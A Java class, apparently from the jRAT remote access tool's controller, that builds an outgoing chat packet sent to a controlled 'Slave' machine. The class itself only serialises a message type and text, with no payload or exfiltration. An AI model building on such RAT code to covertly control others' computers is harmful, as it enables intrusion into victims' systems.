package jrat.module.chat;

import jrat.controller.Slave;
import jrat.controller.packets.outgoing.OutgoingPacket;


public class PacketChatAction implements OutgoingPacket {

    private Type type;
	private String message;

	public PacketChatAction(Type type) {
	    this.type = type;
    }

	public PacketChatAction(Type type, String message) {
		this(type);

	    this.message = message;
	}

	@Override
	public void write(Slave slave) throws Exception {
	    slave.writeByte(type.ordinal());

		if (this.type == Type.MESSAGE) {
            slave.writeLine(message);
        }
	}

	@Override
	public short getPacketId() {
		return 51;
	}

}
